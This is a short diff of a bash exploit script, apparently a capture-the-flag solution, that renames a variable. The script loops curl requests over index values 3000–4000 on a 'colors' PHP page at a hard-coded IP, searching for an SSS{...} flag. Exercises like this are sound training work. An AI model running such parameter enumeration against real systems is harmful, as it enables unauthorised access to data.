@@ -3,20 +3,20 @@ PORT=8082
 
 if [[ $1 == "local" ]]
 then
-    remote='http://127.0.0.1:'$PORT
+    url='http://127.0.0.1:'$PORT
 elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
 then
-    remote='http://141.85.224.115:'$PORT
+    url='http://141.85.224.115:'$PORT
 else
-    remote=$1':'$2
+    url=$1':'$2
 fi
 
 # Colors
 echo "Start exploit for Colors"
-remote=$remote'/colors/index.php?index='
+url=$url'/colors/index.php?index='
 for i in {3000..4000}
 do
-    flag=$(curl -s $remote$i | grep -o "SSS{.*}")
+    flag=$(curl -s $url$i | grep -o "SSS{.*}")
     if [[ ! -z $flag ]]; then
         break
     fi
